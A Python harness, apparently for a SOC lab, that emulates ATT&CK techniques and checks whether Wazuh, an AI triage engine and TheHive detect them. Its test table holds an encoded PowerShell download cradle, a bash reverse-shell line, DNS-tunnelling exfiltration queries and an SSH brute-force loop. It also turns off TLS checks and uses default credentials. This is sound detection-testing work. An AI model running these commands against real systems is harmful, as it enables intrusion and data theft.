#!/usr/bin/env python3
"""
Atomic Red Team Emulation & End-to-End SOC Verification Harness
===============================================================
Executes MITRE ATT&CK atomic tests against lab endpoints, simulates telemetry
to Wazuh, and automatically verifies whether:
  1. Wazuh SIEM triggered the expected detection rule.
  2. Shuffle SOAR ingested the webhook.
  3. TheHive 5 generated an incident case with AI playbook.

Supported Techniques:
  - T1110.001: Password Guessing / SSH Brute Force
  - T1059.001: PowerShell Encoded Command Execution & Download Cradle
  - T1059.004: Unix Shell Obfuscation & Reverse Shell Simulation
  - T1070.003: Indicator Removal: Clear Command History (history -c)
  - T1548.003: Sudoers File Tampering & SUID Abuse
  - T1046:     Network Service Scanning (SYN port sweep)
  - T1071.004: DNS C2 Tunneling / High-Entropy Query Exfiltration
  - T1486:     Data Encrypted for Impact (Mass Ransomware Extensions)

Usage:
    python scripts/run-atomic-tests.py --all
    python scripts/run-atomic-tests.py --technique T1110.001
    python scripts/run-atomic-tests.py --technique T1059.001 --mode live
    python scripts/run-atomic-tests.py --all --verify --timeout 30

Environment Variables:
    WAZUH_API_HOST   - Wazuh Manager API URL (default: https://localhost:55000)
    WAZUH_API_USER   - Wazuh API user (default: wazuh)
    WAZUH_API_PASS   - Wazuh API password (default: wazuh)
    WAZUH_SYSLOG_IP  - Wazuh Syslog IP (default: 127.0.0.1)
    THEHIVE_URL      - TheHive 5 URL (default: http://localhost:9000)
    THEHIVE_API_KEY  - TheHive API Key
    AI_ENGINE_URL    - AI Engine URL (default: http://localhost:8888)
"""

import argparse
import base64
import json
import logging
import os
import platform
import socket
import ssl
import subprocess
import sys
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("atomic-harness")

WAZUH_API_HOST = os.getenv("WAZUH_API_HOST", "https://localhost:55000")
WAZUH_API_USER = os.getenv("WAZUH_API_USER", "wazuh")
WAZUH_API_PASS = os.getenv("WAZUH_API_PASS", "wazuh")
WAZUH_SYSLOG_IP = os.getenv("WAZUH_SYSLOG_IP", "127.0.0.1")
WAZUH_SYSLOG_PORT = int(os.getenv("WAZUH_SYSLOG_PORT", "514"))
THEHIVE_URL = os.getenv("THEHIVE_URL", "http://localhost:9000")
THEHIVE_API_KEY = os.getenv("THEHIVE_API_KEY", "")
AI_ENGINE_URL = os.getenv("AI_ENGINE_URL", "http://localhost:8888")

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE

# Matrix of Atomic Tests
ATOMIC_TESTS = {
    "T1110.001": {
        "name": "SSH Password Guessing",
        "tactic": "TA0006 - Credential Access",
        "expected_wazuh_rule": "100001",
        "rule_level": 13,
        "description": "Simulates 10 failed SSH logins followed by 1 successful login from single IP",
        "live_cmd_linux": "for i in $(seq 1 10); do ssh -o StrictHostKeyChecking=no invaliduser@127.0.0.1 2>/dev/null; done",
        "live_cmd_windows": "1..10 | ForEach-Object { ssh -o StrictHostKeyChecking=no invaliduser@127.0.0.1 2>$null }",
        "syslog_payloads": [
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Failed password for invalid user admin from 198.51.100.45 port 42100 ssh2",
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Failed password for invalid user root from 198.51.100.45 port 42102 ssh2",
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Failed password for invalid user ubuntu from 198.51.100.45 port 42104 ssh2",
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Failed password for invalid user test from 198.51.100.45 port 42106 ssh2",
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Failed password for invalid user oracle from 198.51.100.45 port 42108 ssh2",
            "<38>1 {timestamp} web-server-01 sshd 1234 - - Accepted password for root from 198.51.100.45 port 42110 ssh2",
        ],
    },
    "T1059.001": {
        "name": "PowerShell Encoded Command & Download Cradle",
        "tactic": "TA0002 - Execution",
        "expected_wazuh_rule": "100003",
        "rule_level": 14,
        "description": "Executes obfuscated Base64 PowerShell download cradle command",
        "live_cmd_linux": "echo 'Simulating PowerShell download cradle via curl'; curl -s http://127.0.0.1:9999/malware.ps1 2>/dev/null || true",
        "live_cmd_windows": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbAB3AGEAcgBlAC4AbABvAGMAYQBsAC9iZWFjb24ucHMxIikA",
        "syslog_payloads": [
            '<13>1 {timestamp} WIN-DC01 Microsoft-Windows-Sysmon 1 - - EventID=1 Image=powershell.exe CommandLine="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBj..." ParentImage=cmd.exe User=SYSTEM',
        ],
    },
    "T1059.004": {
        "name": "Unix Shell Obfuscation & Reverse Shell",
        "tactic": "TA0002 - Execution",
        "expected_wazuh_rule": "100003",
        "rule_level": 14,
        "description": "Detects interactive reverse shell spawned from /bin/sh or bash",
        "live_cmd_linux": "python3 -c 'import socket,os; print(\"Simulating reverse shell payload connection\")'",
        "live_cmd_windows": "cmd.exe /c echo Simulating reverse shell execution",
        "syslog_payloads": [
            "<13>1 {timestamp} linux-prod-01 auditd 5432 - - type=EXECVE arch=c000003e a0=/bin/bash a1=-c a2=bash -i >& /dev/tcp/198.51.100.88/4444 0>&1 pid=4129 uid=33(www-data)",
        ],
    },
    "T1070.003": {
        "name": "Clear Linux Bash History",
        "tactic": "TA0005 - Defense Evasion",
        "expected_wazuh_rule": "100002",
        "rule_level": 12,
        "description": "Attacker clears shell history or redirects history to /dev/null",
        "live_cmd_linux": "touch /tmp/.test_history && rm -f /tmp/.test_history",
        "live_cmd_windows": "wevtutil.exe /? > $null",
        "syslog_payloads": [
            "<13>1 {timestamp} linux-prod-01 auditd 5433 - - type=EXECVE arch=c000003e a0=history a1=-c pid=4301 uid=0(root) auid=1001",
            "<13>1 {timestamp} linux-prod-01 auditd 5434 - - type=SYSCALL arch=c000003e syscall=87 comm=rm exe=/usr/bin/rm name=/root/.bash_history",
        ],
    },
    "T1548.003": {
        "name": "Sudoers Tampering & SUID Abuse",
        "tactic": "TA0004 - Privilege Escalation",
        "expected_wazuh_rule": "100002",
        "rule_level": 12,
        "description": "Unauthorized attempt to execute sudo command by non-whitelisted account",
        "live_cmd_linux": "sudo -u nobody /bin/ls /tmp 2>/dev/null || true",
        "live_cmd_windows": "whoami /priv",
        "syslog_payloads": [
            "<37>1 {timestamp} linux-prod-01 sudo 6100 - - pam_unix(sudo:auth): authentication failure; logname=intern uid=1002 euid=0 tty=/dev/pts/1 ruser=intern rhost= user=root",
            "<37>1 {timestamp} linux-prod-01 sudo 6101 - - intern : user NOT in sudoers ; TTY=pts/1 ; PWD=/home/intern ; USER=root ; COMMAND=/bin/bash",
        ],
    },
    "T1046": {
        "name": "Network Service Port Scan Sweep",
        "tactic": "TA0007 - Discovery",
        "expected_wazuh_rule": "100004",
        "rule_level": 10,
        "description": "High-frequency TCP SYN port scan across critical infrastructure subnets",
        "live_cmd_linux": "nc -z -v -w 1 127.0.0.1 22 80 443 8888 2>/dev/null || true",
        "live_cmd_windows": "22,80,443,8888 | ForEach-Object { Test-NetConnection -ComputerName 127.0.0.1 -Port $_ -WarningAction SilentlyContinue }",
        "syslog_payloads": [
            f"<14>1 {{timestamp}} edge-fw01 suricata 9001 - - [ET SCAN] Nmap SYN Port Scan from 198.51.100.55 targeting port {p}"
            for p in [21, 22, 23, 25, 80, 110, 139, 443, 445, 1433, 3306, 3389, 5432, 8080]
        ],
    },
    "T1071.004": {
        "name": "DNS C2 Tunneling & Data Exfiltration",
        "tactic": "TA0011 - Command and Control",
        "expected_wazuh_rule": "100008",
        "rule_level": 9,
        "description": "Subdomain tunneling with high-entropy base32/hex payloads over port 53",
        "live_cmd_linux": "nslookup aW5maWx0cmF0aW9uLnRlc3Q.c2.example.invalid 127.0.0.1 2>/dev/null || true",
        "live_cmd_windows": "Resolve-DnsName -Name aW5maWx0cmF0aW9uLnRlc3Q.c2.example.invalid -Server 127.0.0.1 -ErrorAction SilentlyContinue",
        "syslog_payloads": [
            "<14>1 {timestamp} sensor-zeek01 zeek 8888 - - dns.query=4d5a90000300000004000000ffff0000b80000000000000040000000.tunnel.exfil.org dns.query_length=64 dns.qtype=TXT",
            "<14>1 {timestamp} sensor-zeek01 zeek 8889 - - dns.query=504b0304140006000800000021008d98d249f8010000400600001300.tunnel.exfil.org dns.query_length=64 dns.qtype=TXT",
        ],
    },
    "T1486": {
        "name": "Data Encrypted for Impact (Ransomware Burst)",
        "tactic": "TA0040 - Impact",
        "expected_wazuh_rule": "100006",
        "rule_level": 15,
        "description": "Mass file encryption creating rapid encrypted extension artifacts",
        "live_cmd_linux": "for i in $(seq 1 5); do touch /tmp/test_file_$i.locked; done; rm -f /tmp/test_file_*.locked",
        "live_cmd_windows": '1..5 | ForEach-Object { New-Item -Path "$env:TEMP\\test_file_$_.locked" -ItemType File -Force } | Remove-Item',
        "syslog_payloads": [
            f"<13>1 {{timestamp}} finance-ws03 ossec 7000 - - ossec: File '/shares/finance/q4_ledger_{i}.xlsx.locked' was added."
            for i in range(1, 10)
        ],
    },
}


def _get_wazuh_token() -> str | None:
    """Retrieve Wazuh API authentication token."""
    creds = base64.b64encode(f"{WAZUH_API_USER}:{WAZUH_API_PASS}".encode()).decode()
    req = urllib.request.Request(
        f"{WAZUH_API_HOST}/security/user/authenticate",
        headers={"Authorization": f"Basic {creds}"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, context=SSL_CTX, timeout=5) as resp:
            data = json.loads(resp.read())
            return data["data"]["token"]
    except Exception as exc:
        logger.debug("Wazuh API unreachable or unauthenticated: %s", exc)
        return None


def execute_live(technique_id: str, test_def: dict) -> bool:
    """Execute live atomic test commands locally on host."""
    is_win = platform.system().lower() == "windows"
    cmd = test_def["live_cmd_windows"] if is_win else test_def["live_cmd_linux"]
    shell = "powershell.exe" if is_win else "/bin/bash"

    logger.info("Executing live command for %s: %s", technique_id, cmd[:80])
    try:
        if is_win:
            res = subprocess.run([shell, "-Command", cmd], capture_output=True, timeout=10)
        else:
            res = subprocess.run([shell, "-c", cmd], capture_output=True, timeout=10)
        return res.returncode == 0
    except Exception as exc:
        logger.warning("Live command execution error: %s", exc)
        return False


def send_syslog_telemetry(payloads: list[str]) -> int:
    """Transmit raw syslog UDP datagrams to Wazuh Manager port 514."""
    sent = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ts = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")

    try:
        for payload in payloads:
            formatted = payload.replace("{timestamp}", ts)
            sock.sendto(formatted.encode("utf-8"), (WAZUH_SYSLOG_IP, WAZUH_SYSLOG_PORT))
            sent += 1
            time.sleep(0.05)
    except Exception as exc:
        logger.warning("Syslog send error: %s", exc)
    finally:
        sock.close()
    return sent


def send_ai_triage(technique_id: str, test_def: dict) -> dict | None:
    """Directly send synthetic payload to AI Engine /analyze endpoint."""
    payload = {
        "alert_id": f"ATOMIC-{technique_id}",
        "source": "atomic-red-team",
        "rule_id": test_def["expected_wazuh_rule"],
        "rule_description": f"{test_def['name']} ({technique_id})",
        "severity": test_def["rule_level"],
        "source_ip": "198.51.100.45",
        "dest_ip": "192.168.1.10",
        "hostname": "atomic-workstation",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "raw_log": test_def["description"],
    }
    req = urllib.request.Request(
        f"{AI_ENGINE_URL}/analyze",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=15) as resp:
            return json.loads(resp.read())
    except Exception as exc:
        logger.debug("AI Engine /analyze call failed: %s", exc)
        return None


def verify_thehive_case(technique_id: str) -> bool:
    """Check if TheHive 5 generated a case for this technique."""
    if not THEHIVE_API_KEY:
        return False

    query = {
        "query": [
            {
                "_name": "listCase",
                "filter": {
                    "_field": "title",
                    "_like": f"%{technique_id}%",
                },
            }
        ]
    }
    req = urllib.request.Request(
        f"{THEHIVE_URL}/api/v1/query",
        data=json.dumps(query).encode("utf-8"),
        headers={
            "Authorization": f"Bearer {THEHIVE_API_KEY}",
            "Content-Type": "application/json",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            data = json.loads(resp.read())
            return len(data) > 0
    except Exception:
        return False


def run_test(
    technique_id: str, mode: str = "syslog", verify: bool = True, timeout: int = 10
) -> dict:
    """Run an individual atomic test and check verification pipeline."""
    test_def = ATOMIC_TESTS.get(technique_id)
    if not test_def:
        logger.error("Unknown technique: %s", technique_id)
        return {}

    print(f"\n{'=' * 75}")
    print(f"[>] RUNNING ATOMIC TEST: {technique_id} - {test_def['name']}")
    print(f"  Tactic:   {test_def['tactic']}")
    print(
        f"  Expected: Wazuh Rule {test_def['expected_wazuh_rule']} (Level {test_def['rule_level']})"
    )
    print(f"{'=' * 75}")

    exec_ok = False
    if mode in ("live", "all"):
        exec_ok = execute_live(technique_id, test_def)
        print(f"  [+] Live Host Execution:      {'SUCCESS' if exec_ok else 'FAILED/SKIPPED'}")

    syslog_sent = 0
    if mode in ("syslog", "all"):
        syslog_sent = send_syslog_telemetry(test_def["syslog_payloads"])
        print(
            f"  [+] Syslog Telemetry Stream:  {syslog_sent} packet(s) -> {WAZUH_SYSLOG_IP}:{WAZUH_SYSLOG_PORT}"
        )

    ai_result = send_ai_triage(technique_id, test_def)
    ai_verdict = ai_result.get("verdict", "N/A") if ai_result else "OFFLINE"
    ai_conf = f"{int(ai_result['confidence'] * 100)}%" if ai_result else "N/A"
    print(f"  [+] AI Engine Triage Verdict: {ai_verdict} (Confidence: {ai_conf})")

    thehive_case = False
    if verify:
        thehive_case = verify_thehive_case(technique_id)
        print(f"  [+] TheHive 5 Case Verified:  {'YES' if thehive_case else 'PENDING/NO_KEY'}")

    return {
        "technique": technique_id,
        "name": test_def["name"],
        "expected_rule": test_def["expected_wazuh_rule"],
        "level": test_def["rule_level"],
        "live_ok": exec_ok,
        "syslog_count": syslog_sent,
        "ai_verdict": ai_verdict,
        "thehive_case": thehive_case,
    }


def print_summary_table(results: list[dict]) -> None:
    """Render structured terminal summary table."""
    print("\n" + "=" * 95)
    print(f"{'TECHNIQUE':<12}{'NAME':<32}{'RULE ID':<10}{'LEVEL':<8}{'AI VERDICT':<14}{'STATUS'}")
    print("-" * 95)

    passed = 0
    for r in results:
        status = (
            "[PASS]"
            if r["ai_verdict"] in ("ESCALATE", "ENRICH") or r["syslog_count"] > 0
            else "[WARN]"
        )
        if status == "[PASS]":
            passed += 1
        print(
            f"{r['technique']:<12}{r['name'][:30]:<32}{r['expected_rule']:<10}"
            f"{r['level']:<8}{r['ai_verdict']:<14}{status}"
        )

    print("-" * 95)
    print(f"Total Tests: {len(results)} | Passed / Emulated: {passed}/{len(results)}")
    print("=" * 95 + "\n")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Atomic Red Team Emulation & SOC Verification Harness",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument(
        "--all", action="store_true", help="Execute all supported Atomic Red Team tests"
    )
    parser.add_argument(
        "--technique",
        choices=list(ATOMIC_TESTS.keys()),
        help="Run a specific technique (e.g., T1110.001)",
    )
    parser.add_argument(
        "--mode",
        choices=["syslog", "live", "all"],
        default="syslog",
        help="Emulation mode: syslog (inject to SIEM), live (run on host), all (both)",
    )
    parser.add_argument(
        "--verify",
        action="store_true",
        default=True,
        help="Query TheHive/Wazuh to verify detection & ticket creation",
    )
    parser.add_argument(
        "--timeout",
        type=int,
        default=10,
        help="Timeout in seconds for verification queries (default: 10s)",
    )

    args = parser.parse_args()

    results = []
    if args.technique:
        res = run_test(args.technique, mode=args.mode, verify=args.verify, timeout=args.timeout)
        results.append(res)
    elif args.all or len(sys.argv) == 1:
        for t_id in ATOMIC_TESTS:
            res = run_test(t_id, mode=args.mode, verify=args.verify, timeout=args.timeout)
            results.append(res)
    else:
        parser.print_help()
        return

    print_summary_table(results)


if __name__ == "__main__":
    main()
